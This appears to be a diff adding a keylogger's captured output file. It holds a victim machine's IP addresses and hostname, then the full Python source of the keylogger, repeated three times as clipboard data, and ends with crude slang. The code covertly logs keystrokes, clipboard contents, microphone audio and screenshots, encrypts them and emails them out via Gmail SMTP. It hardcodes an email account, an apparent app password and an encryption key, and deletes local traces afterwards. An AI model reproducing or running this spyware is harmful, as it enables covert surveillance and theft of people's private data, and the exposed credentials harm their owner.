@@ -1,0 +1,671 @@
+Public IP Address: 36.255.16.56
+Processor: Intel64 Family 6 Model 165 Stepping 2, GenuineIntel
+System: Windows 10.0.22631
+Machine: AMD64
+Hostname: SUJAATALI
+Private IP Address: 172.16.244.248
+Clipboard Data:
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import socket
+import platform
+import win32clipboard
+from pynput.keyboard import Key, Listener
+import time
+import os
+from scipy.io.wavfile import write
+import sounddevice as sd
+from cryptography.fernet import Fernet
+import getpass
+from requests import get
+from threading import Thread
+from PIL import ImageGrab
+
+# Get the user's home directory dynamically (cross-platform)
+file_path = os.path.expanduser("~")
+file_merge = os.path.join(file_path, "keylogger_data")
+
+# Ensure the directory exists
+if not os.path.exists(file_merge):
+    os.makedirs(file_merge)
+
+# File paths for storing the logs
+keys_information = os.path.join(file_merge, "key_log.txt")
+system_information = os.path.join(file_merge, "syseminfo.txt")
+clipboard_information = os.path.join(file_merge, "clipboard.txt")
+audio_information = os.path.join(file_merge, "audio.wav")
+screenshot_information = os.path.join(file_merge, "screenshot.png")
+
+keys_information_e = os.path.join(file_merge, "e_key_log.txt")
+system_information_e = os.path.join(file_merge, "e_systeminfo.txt")
+clipboard_information_e = os.path.join(file_merge, "e_clipboard.txt")
+
+
+microphone_time = 10
+time_iteration = 15
+number_of_iterations_end = 3
+
+# Email credentials and configuration
+email_address = "siyakpoor04@gmail.com"  # Enter disposable email here
+password = "frss iqnk zeol onbx"  # Enter email password here
+toaddr = "siyakpoor04@gmail.com"  # Enter the email address you want to send information to
+
+# Encryption Key
+key = "-CVQ6Mz2LN1cj1Tu3ZuK1p7OVOrXhIMvq2xV_tWnYjg="  # Generate encryption key from Cryptography
+
+# Email Controls
+def send_email(filename, attachment, toaddr):
+    try:
+        fromaddr = email_address
+        msg = MIMEMultipart()
+        msg['From'] = fromaddr
+        msg['To'] = toaddr
+        msg['Subject'] = "Log File"
+        body = "Body_of_the_mail"
+        msg.attach(MIMEText(body, 'plain'))
+
+        with open(attachment, 'rb') as attach_file:
+            p = MIMEBase('application', 'octet-stream')
+            p.set_payload(attach_file.read())
+            encoders.encode_base64(p)
+            p.add_header('Content-Disposition', f"attachment; filename={filename}")
+            msg.attach(p)
+
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(fromaddr, password)
+            server.sendmail(fromaddr, toaddr, msg.as_string())
+        print(f"Email sent: {filename}")
+    except Exception as e:
+        print(f"Failed to send email: {e}")
+
+# Get the computer information
+def computer_information():
+    try:
+        with open(system_information, "a") as f:
+            hostname = socket.gethostname()
+            IPAddr = socket.gethostbyname(hostname)
+            try:
+                public_ip = get("https://api.ipify.org").text
+                f.write(f"Public IP Address: {public_ip}\n")
+            except Exception:
+                f.write("Couldn't get Public IP Address (max query limit)\n")
+
+            f.write(f"Processor: {platform.processor()}\n")
+            f.write(f"System: {platform.system()} {platform.version()}\n")
+            f.write(f"Machine: {platform.machine()}\n")
+            f.write(f"Hostname: {hostname}\n")
+            f.write(f"Private IP Address: {IPAddr}\n")
+        print("System information captured.")
+    except Exception as e:
+        print(f"Failed to retrieve system information: {e}")
+
+# Get the clipboard contents
+def copy_clipboard():
+    try:
+        with open(clipboard_information, "a") as f:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            f.write(f"Clipboard Data:\n{pasted_data}\n")
+        print("Clipboard data captured.")
+    except Exception as e:
+        print(f"Failed to retrieve clipboard data: {e}")
+
+# Capture microphone audio
+def microphone():
+    try:
+        fs = 44100
+        seconds = microphone_time
+        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+        sd.wait()
+        write(audio_information, fs, myrecording)
+        print("Audio recorded.")
+    except Exception as e:
+        print(f"Failed to record audio: {e}")
+
+# Capture screenshots
+def screenshot():
+    try:
+        im = ImageGrab.grab()
+        im.save(screenshot_information)
+        print("Screenshot captured.")
+    except Exception as e:
+        print(f"Failed to capture screenshot: {e}")
+
+# Keylogger functionality
+def keylogger():
+    def on_press(key):
+        try:
+            with open(keys_information, "a") as f:
+                k = str(key).replace("'", "")
+                if k.find("space") > 0:
+                    f.write('\n')
+                elif k.find("Key") == -1:
+                    f.write(k)
+                f.flush()  # Ensure logs are written to the disk immediately
+        except Exception as e:
+            print(f"Error logging key: {e}")
+
+    def on_release(key):
+        if key == Key.esc:
+            return False
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+# Encrypt Files
+def encrypt_files():
+    files_to_encrypt = [system_information, clipboard_information, keys_information]
+    encrypted_file_names = [system_information_e, clipboard_information_e, keys_information_e]
+
+    count = 0
+    fernet = Fernet(key)
+
+    for encrypting_file in files_to_encrypt:
+        try:
+            with open(encrypting_file, 'rb') as f:
+                data = f.read()
+
+            encrypted = fernet.encrypt(data)
+
+            with open(encrypted_file_names[count], 'wb') as f:
+                f.write(encrypted)
+
+            send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
+            count += 1
+        except Exception as e:
+            print(f"Failed to encrypt {encrypting_file}: {e}")
+
+# Clean up files
+def clean_up():
+    delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
+    for file in delete_files:
+        try:
+            os.remove(file)
+            print(f"{file} deleted.")
+        except Exception as e:
+            print(f"Failed to delete {file}: {e}")
+
+# Task Scheduler (runs screenshot and clipboard in parallel without interfering with keylogger)
+def task_scheduler():
+    number_of_iterations = 0
+    while number_of_iterations < number_of_iterations_end:
+        time.sleep(time_iteration)
+        screenshot()
+        send_email("screenshot.png", screenshot_information, toaddr)
+        copy_clipboard()
+        number_of_iterations += 1
+
+# Main Execution
+if __name__ == '__main__':
+    try:
+        # Start the keylogger in the main thread
+        keylogger_thread = Thread(target=keylogger)
+        keylogger_thread.start()
+
+        # Execute system info and audio recording
+        computer_information()
+        microphone()
+
+        # Start task scheduler in a separate thread
+        task_scheduler_thread = Thread(target=task_scheduler)
+        task_scheduler_thread.start()
+
+        # Wait for keylogger thread to finish
+        keylogger_thread.join()
+
+        # Encrypt and clean up files
+        encrypt_files()
+        clean_up()
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+Clipboard Data:
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import socket
+import platform
+import win32clipboard
+from pynput.keyboard import Key, Listener
+import time
+import os
+from scipy.io.wavfile import write
+import sounddevice as sd
+from cryptography.fernet import Fernet
+import getpass
+from requests import get
+from threading import Thread
+from PIL import ImageGrab
+
+# Get the user's home directory dynamically (cross-platform)
+file_path = os.path.expanduser("~")
+file_merge = os.path.join(file_path, "keylogger_data")
+
+# Ensure the directory exists
+if not os.path.exists(file_merge):
+    os.makedirs(file_merge)
+
+# File paths for storing the logs
+keys_information = os.path.join(file_merge, "key_log.txt")
+system_information = os.path.join(file_merge, "syseminfo.txt")
+clipboard_information = os.path.join(file_merge, "clipboard.txt")
+audio_information = os.path.join(file_merge, "audio.wav")
+screenshot_information = os.path.join(file_merge, "screenshot.png")
+
+keys_information_e = os.path.join(file_merge, "e_key_log.txt")
+system_information_e = os.path.join(file_merge, "e_systeminfo.txt")
+clipboard_information_e = os.path.join(file_merge, "e_clipboard.txt")
+
+
+microphone_time = 10
+time_iteration = 15
+number_of_iterations_end = 3
+
+# Email credentials and configuration
+email_address = "siyakpoor04@gmail.com"  # Enter disposable email here
+password = "frss iqnk zeol onbx"  # Enter email password here
+toaddr = "siyakpoor04@gmail.com"  # Enter the email address you want to send information to
+
+# Encryption Key
+key = "-CVQ6Mz2LN1cj1Tu3ZuK1p7OVOrXhIMvq2xV_tWnYjg="  # Generate encryption key from Cryptography
+
+# Email Controls
+def send_email(filename, attachment, toaddr):
+    try:
+        fromaddr = email_address
+        msg = MIMEMultipart()
+        msg['From'] = fromaddr
+        msg['To'] = toaddr
+        msg['Subject'] = "Log File"
+        body = "Body_of_the_mail"
+        msg.attach(MIMEText(body, 'plain'))
+
+        with open(attachment, 'rb') as attach_file:
+            p = MIMEBase('application', 'octet-stream')
+            p.set_payload(attach_file.read())
+            encoders.encode_base64(p)
+            p.add_header('Content-Disposition', f"attachment; filename={filename}")
+            msg.attach(p)
+
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(fromaddr, password)
+            server.sendmail(fromaddr, toaddr, msg.as_string())
+        print(f"Email sent: {filename}")
+    except Exception as e:
+        print(f"Failed to send email: {e}")
+
+# Get the computer information
+def computer_information():
+    try:
+        with open(system_information, "a") as f:
+            hostname = socket.gethostname()
+            IPAddr = socket.gethostbyname(hostname)
+            try:
+                public_ip = get("https://api.ipify.org").text
+                f.write(f"Public IP Address: {public_ip}\n")
+            except Exception:
+                f.write("Couldn't get Public IP Address (max query limit)\n")
+
+            f.write(f"Processor: {platform.processor()}\n")
+            f.write(f"System: {platform.system()} {platform.version()}\n")
+            f.write(f"Machine: {platform.machine()}\n")
+            f.write(f"Hostname: {hostname}\n")
+            f.write(f"Private IP Address: {IPAddr}\n")
+        print("System information captured.")
+    except Exception as e:
+        print(f"Failed to retrieve system information: {e}")
+
+# Get the clipboard contents
+def copy_clipboard():
+    try:
+        with open(clipboard_information, "a") as f:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            f.write(f"Clipboard Data:\n{pasted_data}\n")
+        print("Clipboard data captured.")
+    except Exception as e:
+        print(f"Failed to retrieve clipboard data: {e}")
+
+# Capture microphone audio
+def microphone():
+    try:
+        fs = 44100
+        seconds = microphone_time
+        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+        sd.wait()
+        write(audio_information, fs, myrecording)
+        print("Audio recorded.")
+    except Exception as e:
+        print(f"Failed to record audio: {e}")
+
+# Capture screenshots
+def screenshot():
+    try:
+        im = ImageGrab.grab()
+        im.save(screenshot_information)
+        print("Screenshot captured.")
+    except Exception as e:
+        print(f"Failed to capture screenshot: {e}")
+
+# Keylogger functionality
+def keylogger():
+    def on_press(key):
+        try:
+            with open(keys_information, "a") as f:
+                k = str(key).replace("'", "")
+                if k.find("space") > 0:
+                    f.write('\n')
+                elif k.find("Key") == -1:
+                    f.write(k)
+                f.flush()  # Ensure logs are written to the disk immediately
+        except Exception as e:
+            print(f"Error logging key: {e}")
+
+    def on_release(key):
+        if key == Key.esc:
+            return False
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+# Encrypt Files
+def encrypt_files():
+    files_to_encrypt = [system_information, clipboard_information, keys_information]
+    encrypted_file_names = [system_information_e, clipboard_information_e, keys_information_e]
+
+    count = 0
+    fernet = Fernet(key)
+
+    for encrypting_file in files_to_encrypt:
+        try:
+            with open(encrypting_file, 'rb') as f:
+                data = f.read()
+
+            encrypted = fernet.encrypt(data)
+
+            with open(encrypted_file_names[count], 'wb') as f:
+                f.write(encrypted)
+
+            send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
+            count += 1
+        except Exception as e:
+            print(f"Failed to encrypt {encrypting_file}: {e}")
+
+# Clean up files
+def clean_up():
+    delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
+    for file in delete_files:
+        try:
+            os.remove(file)
+            print(f"{file} deleted.")
+        except Exception as e:
+            print(f"Failed to delete {file}: {e}")
+
+# Task Scheduler (runs screenshot and clipboard in parallel without interfering with keylogger)
+def task_scheduler():
+    number_of_iterations = 0
+    while number_of_iterations < number_of_iterations_end:
+        time.sleep(time_iteration)
+        screenshot()
+        send_email("screenshot.png", screenshot_information, toaddr)
+        copy_clipboard()
+        number_of_iterations += 1
+
+# Main Execution
+if __name__ == '__main__':
+    try:
+        # Start the keylogger in the main thread
+        keylogger_thread = Thread(target=keylogger)
+        keylogger_thread.start()
+
+        # Execute system info and audio recording
+        computer_information()
+        microphone()
+
+        # Start task scheduler in a separate thread
+        task_scheduler_thread = Thread(target=task_scheduler)
+        task_scheduler_thread.start()
+
+        # Wait for keylogger thread to finish
+        keylogger_thread.join()
+
+        # Encrypt and clean up files
+        encrypt_files()
+        clean_up()
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+Clipboard Data:
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import socket
+import platform
+import win32clipboard
+from pynput.keyboard import Key, Listener
+import time
+import os
+from scipy.io.wavfile import write
+import sounddevice as sd
+from cryptography.fernet import Fernet
+import getpass
+from requests import get
+from threading import Thread
+from PIL import ImageGrab
+
+# Get the user's home directory dynamically (cross-platform)
+file_path = os.path.expanduser("~")
+file_merge = os.path.join(file_path, "keylogger_data")
+
+# Ensure the directory exists
+if not os.path.exists(file_merge):
+    os.makedirs(file_merge)
+
+# File paths for storing the logs
+keys_information = os.path.join(file_merge, "key_log.txt")
+system_information = os.path.join(file_merge, "syseminfo.txt")
+clipboard_information = os.path.join(file_merge, "clipboard.txt")
+audio_information = os.path.join(file_merge, "audio.wav")
+screenshot_information = os.path.join(file_merge, "screenshot.png")
+
+keys_information_e = os.path.join(file_merge, "e_key_log.txt")
+system_information_e = os.path.join(file_merge, "e_systeminfo.txt")
+clipboard_information_e = os.path.join(file_merge, "e_clipboard.txt")
+
+
+microphone_time = 10
+time_iteration = 15
+number_of_iterations_end = 3
+
+# Email credentials and configuration
+email_address = "siyakpoor04@gmail.com"  # Enter disposable email here
+password = "frss iqnk zeol onbx"  # Enter email password here
+toaddr = "siyakpoor04@gmail.com"  # Enter the email address you want to send information to
+
+# Encryption Key
+key = "-CVQ6Mz2LN1cj1Tu3ZuK1p7OVOrXhIMvq2xV_tWnYjg="  # Generate encryption key from Cryptography
+
+# Email Controls
+def send_email(filename, attachment, toaddr):
+    try:
+        fromaddr = email_address
+        msg = MIMEMultipart()
+        msg['From'] = fromaddr
+        msg['To'] = toaddr
+        msg['Subject'] = "Log File"
+        body = "Body_of_the_mail"
+        msg.attach(MIMEText(body, 'plain'))
+
+        with open(attachment, 'rb') as attach_file:
+            p = MIMEBase('application', 'octet-stream')
+            p.set_payload(attach_file.read())
+            encoders.encode_base64(p)
+            p.add_header('Content-Disposition', f"attachment; filename={filename}")
+            msg.attach(p)
+
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(fromaddr, password)
+            server.sendmail(fromaddr, toaddr, msg.as_string())
+        print(f"Email sent: {filename}")
+    except Exception as e:
+        print(f"Failed to send email: {e}")
+
+# Get the computer information
+def computer_information():
+    try:
+        with open(system_information, "a") as f:
+            hostname = socket.gethostname()
+            IPAddr = socket.gethostbyname(hostname)
+            try:
+                public_ip = get("https://api.ipify.org").text
+                f.write(f"Public IP Address: {public_ip}\n")
+            except Exception:
+                f.write("Couldn't get Public IP Address (max query limit)\n")
+
+            f.write(f"Processor: {platform.processor()}\n")
+            f.write(f"System: {platform.system()} {platform.version()}\n")
+            f.write(f"Machine: {platform.machine()}\n")
+            f.write(f"Hostname: {hostname}\n")
+            f.write(f"Private IP Address: {IPAddr}\n")
+        print("System information captured.")
+    except Exception as e:
+        print(f"Failed to retrieve system information: {e}")
+
+# Get the clipboard contents
+def copy_clipboard():
+    try:
+        with open(clipboard_information, "a") as f:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            f.write(f"Clipboard Data:\n{pasted_data}\n")
+        print("Clipboard data captured.")
+    except Exception as e:
+        print(f"Failed to retrieve clipboard data: {e}")
+
+# Capture microphone audio
+def microphone():
+    try:
+        fs = 44100
+        seconds = microphone_time
+        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+        sd.wait()
+        write(audio_information, fs, myrecording)
+        print("Audio recorded.")
+    except Exception as e:
+        print(f"Failed to record audio: {e}")
+
+# Capture screenshots
+def screenshot():
+    try:
+        im = ImageGrab.grab()
+        im.save(screenshot_information)
+        print("Screenshot captured.")
+    except Exception as e:
+        print(f"Failed to capture screenshot: {e}")
+
+# Keylogger functionality
+def keylogger():
+    def on_press(key):
+        try:
+            with open(keys_information, "a") as f:
+                k = str(key).replace("'", "")
+                if k.find("space") > 0:
+                    f.write('\n')
+                elif k.find("Key") == -1:
+                    f.write(k)
+                f.flush()  # Ensure logs are written to the disk immediately
+        except Exception as e:
+            print(f"Error logging key: {e}")
+
+    def on_release(key):
+        if key == Key.esc:
+            return False
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+# Encrypt Files
+def encrypt_files():
+    files_to_encrypt = [system_information, clipboard_information, keys_information]
+    encrypted_file_names = [system_information_e, clipboard_information_e, keys_information_e]
+
+    count = 0
+    fernet = Fernet(key)
+
+    for encrypting_file in files_to_encrypt:
+        try:
+            with open(encrypting_file, 'rb') as f:
+                data = f.read()
+
+            encrypted = fernet.encrypt(data)
+
+            with open(encrypted_file_names[count], 'wb') as f:
+                f.write(encrypted)
+
+            send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
+            count += 1
+        except Exception as e:
+            print(f"Failed to encrypt {encrypting_file}: {e}")
+
+# Clean up files
+def clean_up():
+    delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
+    for file in delete_files:
+        try:
+            os.remove(file)
+            print(f"{file} deleted.")
+        except Exception as e:
+            print(f"Failed to delete {file}: {e}")
+
+# Task Scheduler (runs screenshot and clipboard in parallel without interfering with keylogger)
+def task_scheduler():
+    number_of_iterations = 0
+    while number_of_iterations < number_of_iterations_end:
+        time.sleep(time_iteration)
+        screenshot()
+        send_email("screenshot.png", screenshot_information, toaddr)
+        copy_clipboard()
+        number_of_iterations += 1
+
+# Main Execution
+if __name__ == '__main__':
+    try:
+        # Start the keylogger in the main thread
+        keylogger_thread = Thread(target=keylogger)
+        keylogger_thread.start()
+
+        # Execute system info and audio recording
+        computer_information()
+        microphone()
+
+        # Start task scheduler in a separate thread
+        task_scheduler_thread = Thread(target=task_scheduler)
+        task_scheduler_thread.start()
+
+        # Wait for keylogger thread to finish
+        keylogger_thread.join()
+
+        # Encrypt and clean up files
+        encrypt_files()
+        clean_up()
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+lund
+mera
+system
+hack
+karega\x12
